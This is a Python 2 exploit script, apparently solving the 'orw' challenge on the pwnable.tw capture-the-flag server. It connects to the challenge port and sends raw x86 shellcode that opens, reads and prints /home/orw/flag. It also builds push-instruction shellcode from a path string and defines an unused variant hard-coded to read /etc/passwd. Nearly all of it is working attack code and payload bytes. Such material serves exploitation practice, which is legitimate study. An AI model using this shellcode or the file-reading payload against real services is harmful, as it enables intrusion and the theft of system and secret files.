import array
import socket
import struct
import binascii

port = 10001

def f_recv(s):
    recv=None
    try:
        recv=s.recv(4096)
    except Exception:
        None
    
    if not recv:
        print("no data received")
    else:
        print("recv len="+str(len(recv))+", data:\n"+str(recv))
    return recv
    
def f_send(s,data):
    print("send len="+str(len(bytearray(data))))    
    s.send(data)

def print_byte_arr(arr):
    res= ''.join("\\x{:02x}".format(x) for x in arr)    
    return res         
    
def convert_string_to_byte_array(string):
    ba=bytearray(string+'\0')
    while len(ba) % 4 !=0:
        ba.extend('\0')
    ba.reverse()
    return ''.join("\\x{:02x}".format(x) for x in ba)   
    
def convert_string_to_hex_array(string):
    ba=bytearray(string+'\0')
    while len(ba) % 4 !=0:
        ba.extend('\0')
    res= ''.join("\\x{:02x}".format(x) for x in ba)              
    return res;    
    
def convert_string_to_push_array_asm32(string):
    ba=bytearray(string+'\0')
    while len(ba) % 4 !=0:
        ba.extend('\0')
    ba.reverse()
    
    n=4
    bytes_arr_r=[ba[i:i+n] for i in range(0, len(ba), n)]
    
    exec_res=""
    exec_binary=bytearray()
    for byte_arr in bytes_arr_r:
        byte_arr.reverse()
        exec_binary.append("\x68")
        for byte in byte_arr:
            exec_binary.append(byte)
            
    print "exec="+print_byte_arr(exec_res)
    return exec_binary;

def execute_payload():  
    ret=False 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(("chall.pwnable.tw", port))        
    f_recv(s)
    
    path='/home/orw/flag'
    shell2="\x31\xc9\xf7\xe1\xeb\x28\x5b\xb0\x05\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x89\xe1\xb2\x01\xcd\x80\x31\xdb\x39\xd8\x74\xea\xb0\x04\xb3\x01\xcd\x80\x44\xeb\xe7\xe8\xd3\xff\xff\xff"+convert_string_to_hex_array(path)
    shell3="\x31\xC9\xF7\xE1\xB0\x05\x51"+convert_string_to_push_array_asm32(path)+"\x89\xE3\xCD\x80\x93\x91\xB0\x03\x66\xBA\xFF\x0F\x42\xCD\x80\x92\xB3\x01\xC1\xE8\x0A\xCD\x80\x93\xCD\x80"
    shell4="\x31\xc9\xf7\xe1\xeb\x28\x5b\xb0\x05\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x89\xe1\xb2\x01\xcd\x80\x31\xdb\x39\xd8\x74\xea\xb0\x04\xb3\x01\xcd\x80\x44\xeb\xe7\xe8\xd3\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"    
    payload=shell3;
    print "payload="+print_byte_arr(payload)
    f_send(s,payload)
    rcv=f_recv(s)    
    
    print('flag = '+str(rcv))   
    s.close()   
   
execute_payload()



